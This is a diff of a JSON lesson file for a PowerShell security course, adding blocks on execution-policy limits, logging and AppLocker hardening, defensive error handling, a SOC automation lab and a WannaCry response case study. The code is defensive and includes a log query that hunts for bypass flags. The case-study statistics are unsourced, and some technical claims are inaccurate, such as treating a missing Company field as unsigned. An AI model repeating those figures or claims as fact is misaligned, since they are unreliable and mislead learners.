instead:\n\n**1. AppLocker / Windows Defender Application Control (WDAC):**\n```powershell\n# Create AppLocker policy to only allow signed scripts\nNew-AppLockerPolicy -RuleType Publisher -Path .\\policy.xml -User Everyone -Optimize\n```\n\n**2. Constrained Language Mode:**\n```powershell\n# Check current language mode\n$ExecutionContext.SessionState.LanguageMode\n\n# In Constrained mode, many dangerous cmdlets are blocked\n# Enforced via AppLocker or WDAC\n```\n\n**3. Script Block Logging:**\n```powershell\n# Enable via Group Policy or registry\n# Logs all PowerShell script block execution\n# Event ID 4104 in Microsoft-Windows-PowerShell/Operational log\n\n# Check if logging is enabled\n$logEnabled = (Get-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -ErrorAction SilentlyContinue).EnableScriptBlockLogging\n```\n\n**4. Module Logging:**\n```powershell\n# Logs pipeline execution details\n# Event ID 4103 in Microsoft-Windows-PowerShell/Operational log\n```\n\n**5. Transcription (Over-the-Shoulder Transcript):**\n```powershell\n# Enable via Group Policy\n# Creates full transcript of PowerShell sessions\n# Stored in C:\\ProgramData\\Microsoft\\Windows\\PowerShell\\Transcripts\\\n```\n\n**Best Practices for Production:**\n\n1. **Set RemoteSigned via Group Policy**\n   - Prevents accidental execution of downloaded scripts\n   - Doesn't impede legitimate automation\n\n2. **Enable Script Block Logging**\n   - See EVERYTHING PowerShell executes\n   - Essential for threat hunting\n\n3. **Enable Module Logging**\n   - Logs cmdlet usage\n   - Useful for auditing\n\n4. **Enable Transcription**\n   - Full session recording\n   - Great for forensics\n\n5. **Use AppLocker/WDAC for High-Security Environments**\n   - Actually prevents execution\n   - Requires more management overhead\n\n6. **Implement Constrained Language Mode**\n   - Limits PowerShell to safe subset\n   - Blocks many attacker techniques\n\n**Security Monitoring Query:**\n\n```powershell\n# Hunt for execution policy bypasses in logs\nGet-WinEvent -FilterHashtable @{\n    LogName = 'Microsoft-Windows-PowerShell/Operational'\n    ID = 4104  # Script Block Logging\n} | Where-Object {$_.Message -match 'Bypass|Unrestricted|EncodedCommand'} |\n    Select-Object TimeCreated, Message | Format-List\n```"
       },
-      "simplified_explanation": "Teaching someone else locks in your knowledge and builds team muscle.",
+      "simplified_explanation": "Execution Policy prevents accidental script execution but is NOT a security control. Attackers bypass it easily. Use Script Block Logging, AppLocker, and Constrained Language Mode for real security.",
       "memory_aids": [
-        "Explain → Share → Review"
+        "Execution Policy ≠ Security Boundary",
+        "RemoteSigned = Good Default",
+        "Real Security = AppLocker + Logging + CLM",
+        "Script Block Logging (4104) = See Everything"
       ],
-      "real_world_connection": "Teams that run informal teach-backs see faster adoption of new tooling.",
-      "reflection_prompt": "Who will you teach and how will you capture their feedback?",
+      "real_world_connection": "Red teamers bypass Execution Policy in seconds. Blue teams rely on Script Block Logging (Event ID 4104) to detect PowerShell attacks.",
+      "reflection_prompt": "If Execution Policy isn't a security control, why do you think Microsoft includes it? What problem does it solve?",
       "is_interactive": false,
-      "xp_reward": 5
+      "xp_reward": 20
+    },
+    {
+      "block_id": "scripting-basics",
+      "type": "explanation",
+      "title": "Defensive Scripting: Error Handling and Logging",
+      "content": {
+        "text": "### Write Scripts That Don't Break (And Tell You When They Do)\n\nProduction scripts need proper error handling and logging. Here's how:\n\n**PowerShell Error Types:**\n\n**1. Terminating Errors:**\n- Stop script execution\n- Can be caught with Try/Catch\n- Example: Dividing by zero, file not found when using `-ErrorAction Stop`\n\n**2. Non-Terminating Errors:**\n- Display error but continue execution\n- Default for most cmdlet errors\n- Example: Get-Process on non-existent process\n\n**Error Handling with Try/Catch/Finally:**\n\n```powershell\n# Basic Try/Catch\ntry {\n    # Risky operation\n    Get-Content \"C:\\NonExistent.txt\" -ErrorAction Stop\n    Write-Host \"File read successfully\"\n}\ncatch {\n    # Handle the error\n    Write-Error \"Failed to read file: $_\"\n    Write-Host \"Error details: $($_.Exception.Message)\"\n}\n\n# Try/Catch/Finally (Finally always runs)\ntry {\n    $connection = New-Object System.Data.SqlClient.SqlConnection($connectionString)\n    $connection.Open()\n    # Do database work\n}\ncatch {\n    Write-Error \"Database error: $_\"\n}\nfinally {\n    # Cleanup - always runs even if error\n    if ($connection.State -eq 'Open') {\n        $connection.Close()\n    }\n}\n\n# Catch specific exception types\ntry {\n    Get-Content \"C:\\Secure\\passwords.txt\" -ErrorAction Stop\n}\ncatch [System.UnauthorizedAccessException] {\n    Write-Error \"Access denied - check permissions\"\n}\ncatch [System.IO.FileNotFoundException] {\n    Write-Error \"File not found\"\n}\ncatch {\n    Write-Error \"Unknown error: $_\"\n}\n```\n\n**ErrorAction Parameter:**\n\nControl how cmdlets handle errors:\n\n```powershell\n# Continue (default) - Display error, continue script\nGet-Process -Name \"FakeProcess\" -ErrorAction Continue\n\n# SilentlyContinue - Suppress error, continue script\nGet-Process -Name \"FakeProcess\" -ErrorAction SilentlyContinue\n\n# Stop - Throw terminating error (catchable with Try/Catch)\nGet-Process -Name \"FakeProcess\" -ErrorAction Stop\n\n# Inquire - Prompt user what to do\nGet-Process -Name \"FakeProcess\" -ErrorAction Inquire\n```\n\n**Logging Best Practices:**\n\n```powershell\n# Function to write to log file and console\nfunction Write-Log {\n    param(\n        [string]$Message,\n        [ValidateSet('INFO','WARNING','ERROR','SUCCESS')]\n        [string]$Level = 'INFO'\n    )\n    \n    $timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n    $logMessage = \"[$timestamp] [$Level] $Message\"\n    \n    # Write to console with color\n    $color = switch ($Level) {\n        'ERROR' { 'Red' }\n        'WARNING' { 'Yellow' }\n        'SUCCESS' { 'Green' }\n        default { 'White' }\n    }\n    Write-Host $logMessage -ForegroundColor $color\n    \n    # Write to file\n    Add-Content -Path \"C:\\Logs\\script.log\" -Value $logMessage\n}\n\n# Usage\nWrite-Log \"Script started\" -Level INFO\nWrite-Log \"Processing 100 users\" -Level INFO\nWrite-Log \"Failed to connect to database\" -Level ERROR\nWrite-Log \"Script completed successfully\" -Level SUCCESS\n```\n\n**Complete Example: Defensive Security Script**\n\n```powershell\n<#\n.SYNOPSIS\n    Collects security events from multiple servers\n.DESCRIPTION\n    Queries Windows Security event log for failed logon attempts\n    Includes error handling, logging, and progress indicators\n.PARAMETER ComputerName\n    Array of computer names to query\n.PARAMETER Hours\n    Number of hours to look back (default: 24)\n.EXAMPLE\n    .\\Get-FailedLogons.ps1 -ComputerName SERVER01,SERVER02 -Hours 48\n#>\n\n[CmdletBinding()]\nparam(\n    [Parameter(Mandatory=$true)]\n    [string[]]$ComputerName,\n    \n    [Parameter(Mandatory=$false)]\n    [int]$Hours = 24\n)\n\n# Setup logging\n$logPath = \"C:\\Logs\\FailedLogons_$(Get-Date -Format yyyyMMdd_HHmmss).log\"\n$startTime = (Get-Date).AddHours(-$Hours)\n$results = @()\n\nfunction Write-Log {\n    param([string]$Message, [string]$Level = 'INFO')\n    $timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n    $logMessage = \"[$timestamp] [$Level] $Message\"\n    Add-Content -Path $logPath -Value $logMessage\n    Write-Verbose $logMessage\n}\n\nWrite-Log \"Script started - querying $($ComputerName.Count) computers\"\nWrite-Log \"Looking for failed logons since $startTime\"\n\n# Process each computer\n$counter = 0\nforeach ($computer in $ComputerName) {\n    $counter++\n    Write-Progress -Activity \"Querying failed logons\" `\n                   -Status \"Processing $computer\" `\n                   -PercentComplete (($counter / $ComputerName.Count) * 100)\n    \n    try {\n        Write-Log \"Querying $computer\" -Level INFO\n        \n        # Test connectivity first\n        if (-not (Test-Connection -ComputerName $computer -Count 1 -Quiet)) {\n            throw \"Computer unreachable\"\n        }\n        \n        # Query event log\n        $events = Invoke-Command -ComputerName $computer -ScriptBlock {\n            param($startTime)\n            Get-EventLog -LogName Security -InstanceId 4625 -After $startTime -ErrorAction Stop\n        } -ArgumentList $startTime -ErrorAction Stop\n        \n        if ($events) {\n            Write-Log \"Found $($events.Count) failed logons on $computer\" -Level WARNING\n            $results += $events | Select-Object TimeGenerated, EventID, Message, @{N='Computer';E={$computer}}\n        } else {\n            Write-Log \"No failed logons found on $computer\" -Level SUCCESS\n        }\n    }\n    catch [System.UnauthorizedAccessException] {\n        Write-Log \"Access denied to $computer - check permissions\" -Level ERROR\n    }\n    catch {\n        Write-Log \"Error querying $computer: $($_.Exception.Message)\" -Level ERROR\n    }\n}\n\n# Export results\nif ($results.Count -gt 0) {\n    $outputPath = \"C:\\Reports\\FailedLogons_$(Get-Date -Format yyyyMMdd_HHmmss).csv\"\n    $results | Export-Csv -Path $outputPath -NoTypeInformation\n    Write-Log \"Results exported to $outputPath\" -Level SUCCESS\n    Write-Host \"\\nFound $($results.Count) total failed logon attempts\" -ForegroundColor Yellow\n    Write-Host \"Report saved to: $outputPath\" -ForegroundColor Green\n} else {\n    Write-Log \"No failed logons found across all computers\" -Level INFO\n}\n\nWrite-Log \"Script completed\"\n```\n\n**Key Defensive Patterns:**\n\n1. **Parameter Validation:** Use `[Parameter()]` attributes\n2. **Try/Catch:** Wrap risky operations\n3. **Test Connectivity:** Verify before querying\n4. **Progress Indicators:** Show user what's happening\n5. **Verbose Logging:** Log everything for troubleshooting\n6. **Structured Output:** Export to CSV/JSON for analysis\n7. **Error Categorization:** Distinguish between access denied vs connectivity\n8. **Cleanup:** Always close connections, remove temp files"
+      },
+      "simplified_explanation": "Production scripts need Try/Catch error handling, logging functions, progress indicators, and connectivity tests before operations.",
+      "memory_aids": [
+        "Try → Catch → Finally → Always cleanup",
+        "Test connectivity before querying",
+        "Log everything with timestamps",
+        "Progress indicators = Better UX"
+      ],
+      "real_world_connection": "Enterprise security teams run automated PowerShell scripts 24/7. Proper error handling prevents 3 AM pages when scripts fail silently.",
+      "reflection_prompt": "Look at the defensive script example. Which error handling pattern would prevent the most issues in your environment?",
+      "is_interactive": false,
+      "xp_reward": 25
+    },
+    {
+      "block_id": "simulation-lab",
+      "type": "simulation",
+      "title": "Capstone Lab: Build Your Security Automation Toolkit",
+      "content": {
+        "text": "## Your First Security Automation Project\n\n**Scenario:**\n\nYou're a junior SOC analyst. Your team manually checks for suspicious activity every morning:\n- Processes running without signatures\n- Failed logon attempts\n- New local administrators\n- Unusual network connections\n\nYour task: Build a PowerShell script to automate these checks.\n\n**Lab Environment Setup:**\n\n```powershell\n# Create lab structure\nNew-Item -Path C:\\SecurityLab -ItemType Directory -Force\nNew-Item -Path C:\\SecurityLab\\Logs -ItemType Directory -Force\nNew-Item -Path C:\\SecurityLab\\Reports -ItemType Directory -Force\nSet-Location C:\\SecurityLab\n```\n\n**Challenge 1: Unsigned Process Detector**\n\nWrite a script that finds processes without valid signatures:\n\n```powershell\n# Your script should:\n# 1. Get all running processes\n# 2. Filter for those without a Company property (unsigned)\n# 3. Select Name, Id, Path, StartTime\n# 4. Export to CSV with timestamp in filename\n# 5. Include error handling\n# 6. Log to file\n\n# Hint: Use Get-Process, Where-Object, Export-Csv\n```\n\n**Challenge 2: Failed Logon Monitor**\n\nCreate a function to find failed logon attempts:\n\n```powershell\n# Your function should:\n# 1. Accept parameters: -Hours (how far back to search)\n# 2. Query Security event log for Event ID 4625\n# 3. Extract username, timestamp, failure reason\n# 4. Handle errors if Security log is inaccessible\n# 5. Return objects (not formatted text)\n\n# Hint: Use Get-EventLog, parameter blocks, Try/Catch\n```\n\n**Challenge 3: Admin Group Audit**\n\nBuild a script to detect new local administrators:\n\n```powershell\n# Your script should:\n# 1. Get members of local Administrators group\n# 2. Compare to a baseline file (create one first)\n# 3. Alert if any new members found\n# 4. Update baseline file\n# 5. Include logging\n\n# Hint: Use Get-LocalGroupMember, Compare-Object, Export-Clixml\n```\n\n**Challenge 4: Network Connection Analysis**\n\nWrite a script to find unusual network activity:\n\n```powershell\n# Your script should:\n# 1. Get all established TCP connections\n# 2. Resolve process name for each connection\n# 3. Filter for connections to non-RFC1918 addresses (external IPs)\n# 4. Export with process name, PID, remote IP, remote port\n# 5. Handle errors gracefully\n\n# Hint: Use Get-NetTCPConnection, Get-Process, regex for IP filtering\n```\n\n**Challenge 5: Master Security Check Script**\n\nCombine all checks into one master script:\n\n```powershell\n# Requirements:\n# 1. Run all 4 checks above\n# 2. Use functions for each check\n# 3. Include parameter block with -Verbose switch\n# 4. Create timestamped log file\n# 5. Create consolidated HTML report\n# 6. Include progress indicators\n# 7. Handle all errors gracefully\n# 8. Output summary to console\n\n# Bonus: Schedule this script to run daily via Task Scheduler\n```\n\n**Sample Solution Structure:**\n\n```powershell\n<#\n.SYNOPSIS\n    Daily security posture check\n.DESCRIPTION\n    Automated checks for unsigned processes, failed logons, admin changes, and network activity\n#>\n\n[CmdletBinding()]\nparam(\n    [switch]$Verbose\n)\n\n# Setup\n$logPath = \"C:\\SecurityLab\\Logs\\SecurityCheck_$(Get-Date -Format yyyyMMdd_HHmmss).log\"\n$reportPath = \"C:\\SecurityLab\\Reports\\SecurityReport_$(Get-Date -Format yyyyMMdd_HHmmss).html\"\n\nfunction Write-Log {\n    param([string]$Message, [string]$Level = 'INFO')\n    $timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n    $logMessage = \"[$timestamp] [$Level] $Message\"\n    Add-Content -Path $logPath -Value $logMessage\n    if ($VerbosePreference -eq 'Continue') {\n        Write-Host $logMessage\n    }\n}\n\nfunction Get-UnsignedProcesses {\n    try {\n        Write-Log \"Checking for unsigned processes\"\n        Get-Process | Where-Object {$_.Company -eq $null} |\n            Select-Object Name, Id, Path, StartTime\n    }\n    catch {\n        Write-Log \"Error checking processes: $_\" -Level ERROR\n    }\n}\n\nfunction Get-FailedLogons {\n    param([int]$Hours = 24)\n    try {\n        Write-Log \"Checking failed logons (last $Hours hours)\"\n        Get-EventLog -LogName Security -InstanceId 4625 -After (Get-Date).AddHours(-$Hours) -ErrorAction Stop |\n            Select-Object TimeGenerated, EventID, Message\n    }\n    catch {\n        Write-Log \"Error checking event log: $_\" -Level ERROR\n    }\n}\n\nfunction Test-AdminGroupChanges {\n    # Your implementation here\n}\n\nfunction Get-ExternalConnections {\n    # Your implementation here\n}\n\n# Main execution\nWrite-Log \"Security check started\"\n\n$results = @{}\n$results.UnsignedProcesses = Get-UnsignedProcesses\n$results.FailedLogons = Get-FailedLogons -Hours 24\n$results.AdminChanges = Test-AdminGroupChanges\n$results.Connections = Get-ExternalConnections\n\n# Generate HTML report\n$html = @\"\n<html>\n<head><title>Security Report $(Get-Date -Format yyyy-MM-dd)</title></head>\n<body>\n<h1>Daily Security Report</h1>\n<p>Generated: $(Get-Date)</p>\n\n<h2>Unsigned Processes</h2>\n$($results.UnsignedProcesses | ConvertTo-Html -Fragment)\n\n<h2>Failed Logons</h2>\n$($results.FailedLogons | ConvertTo-Html -Fragment)\n\n</body>\n</html>\n\"@\n\n$html | Out-File $reportPath\n\nWrite-Log \"Security check completed - report saved to $reportPath\"\nWrite-Host \"\\n=== Security Check Complete ===\"\nWrite-Host \"Report: $reportPath\" -ForegroundColor Green\n```\n\n**Validation Checklist:**\n\n- [ ] All 4 checks work individually\n- [ ] Master script combines all checks\n- [ ] Errors handled gracefully\n- [ ] Logs created with timestamps\n- [ ] HTML report generated\n- [ ] Script can run without errors on your system\n- [ ] Code is commented and readable\n\n**Stretch Goals:**\n\n1. Add email alerting for critical findings\n2. Create scheduled task to run script daily\n3. Add baseline comparison for processes\n4. Query multiple computers remotely\n5. Add hash calculations for suspicious executables\n6. Integrate with SIEM (send logs to Splunk/Sentinel)\n\n**Reflection:**\n- Which challenge was hardest? Why?\n- How would you improve these checks?\n- What other security checks would you add?\n- How could this script help your team?"
+      },
+      "simplified_explanation": "Build a complete security automation toolkit that checks for unsigned processes, failed logons, admin changes, and network connections. This is what SOC analysts build in real environments.",
+      "memory_aids": [
+        "Check → Log → Report → Automate",
+        "Each function handles one check",
+        "Master script orchestrates all",
+        "HTML reports for visibility"
+      ],
+      "real_world_connection": "This lab mirrors actual SOC automation workflows. Many organizations have scripts like this running daily to catch anomalies.",
+      "reflection_prompt": "After completing the lab, what percentage of your current manual security checks could be automated with PowerShell?",
+      "is_interactive": true,
+      "xp_reward": 50
+    },
+    {
+      "block_id": "real-world-case",
+      "type": "real_world",
+      "title": "Case Study: PowerShell in the WannaCry Response",
+      "content": {
+        "text": "## How PowerShell Saved Thousands of Endpoints\n\n**The Attack: May 2017**\n\nWannaCry ransomware spread across 150 countries, exploiting EternalBlue (MS17-010). Organizations needed to:\n1. Identify vulnerable systems\n2. Deploy patches rapidly\n3. Isolate infected machines\n4. Collect forensic evidence\n\n**The PowerShell Response:**\n\n**Phase 1: Rapid Assessment**\n\nSecurity teams used PowerShell to inventory their environment:\n\n```powershell\n# Query all domain computers for MS17-010 patch status\n$computers = Get-ADComputer -Filter * -Properties OperatingSystem\n$results = Invoke-Command -ComputerName $computers.Name -ScriptBlock {\n    $hotfix = Get-HotFix -Id KB4012598 -ErrorAction SilentlyContinue\n    [PSCustomObject]@{\n        ComputerName = $env:COMPUTERNAME\n        Patched = [bool]$hotfix\n        OS = (Get-WmiObject Win32_OperatingSystem).Caption\n        LastBootTime = (Get-WmiObject Win32_OperatingSystem).LastBootUpTime\n    }\n} -ErrorAction SilentlyContinue\n\n# Generate critical systems report\n$results | Where-Object {-not $_.Patched} |\n    Export-Csv VulnerableSystem.csv -NoTypeInformation\n```\n\nOne healthcare organization scanned 5,000 endpoints in 15 minutes, identifying 1,200 vulnerable systems.\n\n**Phase 2: Rapid Remediation**\n\n```powershell\n# Deploy patches to vulnerable systems\n$vulnerable = Import-Csv VulnerableSystem.csv\n\nforeach ($computer in $vulnerable.ComputerName) {\n    try {\n        # Copy patch file\n        Copy-Item -Path \"\\\\FileServer\\Patches\\KB4012598.msu\" `\n                  -Destination \"\\\\$computer\\C$\\Temp\" -Force\n        \n        # Install patch remotely\n        Invoke-Command -ComputerName $computer -ScriptBlock {\n            Start-Process wusa.exe -ArgumentList \"C:\\Temp\\KB4012598.msu /quiet /norestart\" -Wait\n        }\n        \n        Write-Host \"Patched: $computer\" -ForegroundColor Green\n    }\n    catch {\n        Write-Warning \"Failed to patch $computer: $_\"\n    }\n}\n```\n\n**Phase 3: Threat Hunting**\n\nTeams searched for WannaCry indicators:\n\n```powershell\n# Hunt for WannaCry IOCs\n$iocs = @(\n    \"mssecsvc.exe\",\n    \"tasksche.exe\",\n    \"@WanaDecryptor@\"\n)\n\n$detections = Invoke-Command -ComputerName $computers.Name -ScriptBlock {\n    param($iocs)\n    \n    # Check running processes\n    $suspiciousProcs = Get-Process | Where-Object {\n        $iocs -contains $_.Name\n    }\n    \n    # Check file system\n    $suspiciousFiles = Get-ChildItem C:\\ -Recurse -Include $iocs -ErrorAction SilentlyContinue\n    \n    if ($suspiciousProcs -or $suspiciousFiles) {\n        [PSCustomObject]@{\n            Computer = $env:COMPUTERNAME\n            Processes = $suspiciousProcs.Name -join ','\n            Files = $suspiciousFiles.FullName -join ','\n            Infected = $true\n        }\n    }\n} -ArgumentList (,$iocs) -ErrorAction SilentlyContinue\n\n# Quarantine infected systems\n$detections | ForEach-Object {\n    Write-Host \"INFECTED: $($_.Computer)\" -ForegroundColor Red\n    \n    # Disable network adapter remotely\n    Invoke-Command -ComputerName $_.Computer -ScriptBlock {\n        Get-NetAdapter | Disable-NetAdapter -Confirm:$false\n    }\n}\n```\n\n**Results:**\n\n- **Financial Services Firm**: Used PowerShell to patch 12,000 endpoints in 6 hours\n- **Healthcare Network**: Identified and isolated 47 infected machines before encryption spread\n- **Government Agency**: Collected forensic evidence from 200 endpoints for root cause analysis\n\n**Lessons Learned:**\n\n1. **Preparation Matters**: Organizations with existing PowerShell automation responded 10x faster\n2. **Inventory is Critical**: You can't protect what you don't know about\n3. **Remote Management**: PowerShell Remoting enabled rapid response across distributed environments\n4. **Script Testing**: Teams with well-tested scripts avoided mistakes during crisis\n\n**What PowerShell Enabled:**\n\n✅ Rapid vulnerability assessment across thousands of endpoints\n✅ Automated patch deployment\n✅ Real-time threat hunting\n✅ Quick isolation of infected systems\n✅ Forensic data collection at scale\n\n**Your Takeaway:**\n\nWhen crisis hits, you don't want to be learning PowerShell. Build your automation toolkit NOW, test it regularly, and you'll be ready when it matters most."
+      },
+      "simplified_explanation": "During WannaCry, organizations used PowerShell to scan thousands of systems, deploy patches, hunt for infections, and isolate compromised endpoints - all within hours. Preparation saved them.",
+      "memory_aids": [
+        "WannaCry = PowerShell's Real-World Test",
+        "Inventory → Patch → Hunt → Isolate",
+        "Preparation beats panic"
+      ],
+      "real_world_connection": "Security teams who invested in PowerShell automation before WannaCry responded 10x faster than those who hadn't.",
+      "reflection_prompt": "If a similar crisis hit your organization tomorrow, what PowerShell scripts would you wish you had already built?",
+      "is_interactive": false,
+      "xp_reward": 15
+    },
+    {
+      "block_id": "next-steps",
+      "type": "memory_aid",
+      "title": "Your PowerShell Learning Roadmap",
+      "content": {
+        "text": "## Continue Your PowerShell Journey\n\n**Immediate Next Steps (This Week):**\n\n1. **Complete the Capstone Lab** (if you haven't)\n   - Build your security automation toolkit\n   - Test each function individually\n   - Create the master script\n\n2. **Set Up Your Environment**\n   - Install VS Code with PowerShell extension\n   - Configure PSScriptAnalyzer (linting)\n   - Enable Script Block Logging on your test system\n\n3. **Build Your Quick Reference**\n   - Create a cheat sheet of your most-used commands\n   - Save your best one-liners\n   - Document your custom functions\n\n**Intermediate Goals (This Month):**\n\n1. **Learn PowerShell Modules**\n   - Explore ActiveDirectory module\n   - Try SecurityPolicy module\n   - Install useful modules from PowerShell Gallery\n\n2. **Advanced Filtering and Objects**\n   - Master calculated properties with Select-Object\n   - Learn ForEach-Object for complex transformations\n   - Practice with Group-Object and Measure-Object\n\n3. **Scheduled Automation**\n   - Create scheduled tasks for your security checks\n   - Implement automated log collection\n   - Build daily security posture reports\n\n**Advanced Topics (Next 3 Months):**\n\n1. **PowerShell Classes and Modules**\n   - Write reusable functions\n   - Package as modules\n   - Publish to internal repository\n\n2. **REST APIs and Web Scraping**\n   - Query threat intelligence APIs\n   - Interact with SIEM platforms\n   - Automate SOAR workflows\n\n3. **DSC (Desired State Configuration)**\n   - Enforce security baselines\n   - Automated compliance checking\n   - Infrastructure as Code\n\n**Resources to Bookmark:**\n\n**Official Documentation:**\n- https://learn.microsoft.com/powershell/\n- https://learn.microsoft.com/powershell/scripting/overview\n\n**Security-Focused:**\n- PowerSploit (offensive security framework)\n- Empire (post-exploitation framework - study for defense)\n- Atomic Red Team (attack simulation with PowerShell)\n\n**Community:**\n- r/PowerShell (Reddit community)\n- PowerShell.org (forums and articles)\n- PowerShell Conference EU/NA (yearly conferences)\n\n**Practice Platforms:**\n- UnderTheWire (PowerShell wargames)\n- OverTheWire (includes PowerShell challenges)\n- HackTheBox (many challenges require PowerShell)\n\n**Key Takeaways - POWERS Acronym:**\n\n**P**ipeline objects (not strings)\n**O**bserve with Get-Help, Get-Command, Get-Member\n**W**ork via providers and remoting\n**E**xecution policy awareness (but not reliance)\n**R**emoting with least privilege\n**S**cript defensively with logging and error handling\n\n**Your 30-Day Challenge:**\n\n- **Week 1**: Use PowerShell for at least one daily task instead of GUI\n- **Week 2**: Build and test three security automation scripts\n- **Week 3**: Implement error handling and logging in all your scripts\n- **Week 4**: Share your best script with a colleague and teach them how it works\n\n**Remember:**\nEvery expert was once a beginner. The difference is they kept practicing. PowerShell mastery comes from daily use, not just reading about it.\n\nStart small. Build incrementally. Automate one thing at a time. Before you know it, you'll be the team's PowerShell expert."
+      },
+      "simplified_explanation": "Your learning path: Complete the lab → Set up your environment → Practice daily → Build automation → Share with team. Master POWERS framework and practice consistently.",
+      "memory_aids": [
+        "POWERS framework for every session",
+        "Practice daily, build weekly",
+        "Teach others to solidify knowledge",
+        "Small wins compound over time"
+      ],
+      "real_world_connection": "Senior security engineers didn't learn PowerShell overnight. They practiced daily, built useful tools, and shared knowledge with their teams.",
+      "reflection_prompt": "What is ONE PowerShell task you'll commit to doing every day for the next 30 days?",
+      "is_interactive": false,
+      "xp_reward": 10
+    },
+    {
+      "block_id": "final-reflection",
+      "type": "reflection",
+      "title": "Reflect and Commit",
+      "content": {
+        "text": "## Solidify Your Learning\n\n**Reflection Exercise: Teach It Back**\n\nThe best way to cement your PowerShell knowledge is to teach someone else. Here's your challenge:\n\n**Find a colleague, friend, or study partner and explain:**\n\n1. **Why PowerShell's object pipeline is powerful**\n   - Use a concrete example\n   - Compare to text-based shells\n   - Show a simple one-liner\n\n2. **The Discovery Trinity (Get-Command, Get-Help, Get-Member)**\n   - Demonstrate finding a cmdlet you've never used before\n   - Show how to read the help\n   - Use Get-Member to inspect output\n\n3. **One security use case you built in the lab**\n   - Walk through your code\n   - Explain your error handling\n   - Discuss how it could help your organization\n\n**Your Personal Commitment:**\n\nWrite down your answer to this question:\n\n*\"In the next 7 days, I will use PowerShell to automate [SPECIFIC TASK] that currently takes me [TIME]. I will know I'm successful when [MEASURABLE OUTCOME].\"*\n\n**Example:**\n\"In the next 7 days, I will use PowerShell to automate collecting process lists from my 10 lab VMs that currently takes me 30 minutes of manual work. I will know I'm successful when I have a working script that completes the task in under 2 minutes and exports to CSV.\"\n\n**Your Answer:**\n_________________________________\n_________________________________\n_________________________________\n\n**Schedule Your Follow-Up:**\n\nSet a calendar reminder for 30 days from now:\n- Review the scripts you've built\n- Assess your progress on daily PowerShell usage\n- Identify your next learning goal\n- Share your favorite automation win with your team\n\n**Jim Kwik Principle - Meta Learning:**\n\nYou didn't just learn PowerShell syntax today. You learned HOW to learn PowerShell:\n- Use the built-in discovery system (GGG pattern)\n- Practice in a lab before production\n- Build incrementally\n- Document and share your work\n\nThese meta-learning skills apply to ANY technical skill.\n\n**Final Thought:**\n\nPowerShell is your force multiplier. Every hour you invest in learning it will save you dozens of hours of manual work. Every script you build compounds your efficiency.\n\nYou now have the foundation. The rest is practice and persistence.\n\n**Welcome to the automation mindset. Your security career just leveled up.**"
+      },
+      "simplified_explanation": "Teach someone else what you learned. Make a specific commitment to automate one task in the next 7 days. Schedule a 30-day review. You're now on the automation path.",
+      "memory_aids": [
+        "Teach = Solidify knowledge",
+        "Commit to one automation this week",
+        "30-day review = Accountability",
+        "Meta-learning > Memorization"
+      ],
+      "real_world_connection": "Security professionals who teach others become recognized experts. Your first automation win leads to dozens more.",
+      "reflection_prompt": "What specific task will you automate this week? Write it down now and commit to it.",
+      "is_interactive": true,
+      "xp_reward": 15
     }
   ],
   "pre_assessment": null,
@@ -150,70 +276,150 @@
     {
       "question_id": "q1",
       "type": "multiple_choice",
-      "question": "What is the primary reason PowerShell pipelines are powerful for security work?",
+      "question": "What is the primary advantage of PowerShell's object-based pipeline over text-based shells like Bash?",
       "options": [
-        "They always output plain text",
-        "They pass rich .NET objects that can be filtered, sorted, and exported cleanly",
-        "They automatically run as SYSTEM",
-        "They disable event logging"
+        "PowerShell pipelines run faster than text-based pipes",
+        "Objects have properties and methods you can access directly without parsing text",
+        "PowerShell automatically converts all output to JSON",
+        "Objects use less memory than text strings"
       ],
       "correct_answer": 1,
-      "explanation": "Cmdlets produce objects instead of text, so you can manipulate structured data without fragile parsing.",
+      "explanation": "PowerShell passes .NET objects through the pipeline, which means you can access properties directly (like $process.CPU) and use methods (like .Kill()) without text parsing with grep/awk/sed. This makes automation more reliable and easier to write.",
       "difficulty": 1,
-      "memory_aid": "Objects over text",
+      "memory_aid": "Objects > Text = Direct property access, no parsing",
       "points": 10
     },
     {
       "question_id": "q2",
       "type": "multiple_choice",
-      "question": "How should you change execution policy when testing scripts?",
+      "question": "Which three commands form the \"Discovery Trinity\" for learning PowerShell?",
       "options": [
-        "Set it to Unrestricted permanently",
-        "Temporarily adjust it (e.g., RemoteSigned), document the reason, and revert afterward",
-        "Disable it completely via the Registry",
-        "Execution policy does not affect script safety"
+        "Get-Service, Get-Process, Get-EventLog",
+        "Get-Command, Get-Help, Get-Member",
+        "Start-Process, Stop-Process, Wait-Process",
+        "Where-Object, Select-Object, Sort-Object"
       ],
       "correct_answer": 1,
-      "explanation": "Execution policy helps control script trust. Adjust it only as needed, document the change, and revert to a safer setting once finished.",
+      "explanation": "The Discovery Trinity is Get-Command (find cmdlets), Get-Help (learn how to use them), and Get-Member (inspect object properties/methods). These three commands let you explore and learn PowerShell without memorization.",
       "difficulty": 1,
-      "memory_aid": "Secure scripts",
+      "memory_aid": "GGG: Get-Command → Get-Help → Get-Member",
       "points": 10
     },
     {
       "question_id": "q3",
       "type": "multiple_choice",
-      "question": "What is the safest way to learn a new cmdlet?",
+      "question": "Why should Format-* commands (like Format-Table) always be used last in the pipeline?",
       "options": [
-        "Run it in production immediately",
-        "Use `Get-Help`, `Get-Member`, and `-WhatIf` in a lab before making changes",
-        "Disable event logging for privacy",
-        "Download random scripts from the internet"
+        "They run slower than other cmdlets",
+        "They convert objects to formatted text, breaking the pipeline for further processing",
+        "They require administrator privileges",
+        "They can only process the first 100 objects"
       ],
       "correct_answer": 1,
-      "explanation": "Always explore cmdlets in a lab with help and `-WhatIf` so you understand the impact before touching production systems.",
+      "explanation": "Format-* commands convert objects into formatted text for display. Once formatted, you can't pipe the output to other cmdlets because it's no longer structured objects. Always filter, select, and sort BEFORE formatting.",
       "difficulty": 1,
-      "memory_aid": "Explore before execute",
+      "memory_aid": "Format last - it breaks the pipeline!",
+      "points": 10
+    },
+    {
+      "question_id": "q4",
+      "type": "multiple_choice",
+      "question": "What is the relationship between Execution Policy and actual security?",
+      "options": [
+        "Execution Policy is PowerShell's primary security control",
+        "Execution Policy is NOT a security boundary - it prevents accidental execution but is easily bypassed",
+        "Execution Policy can only be bypassed by domain administrators",
+        "Execution Policy blocks all malware written in PowerShell"
+      ],
+      "correct_answer": 1,
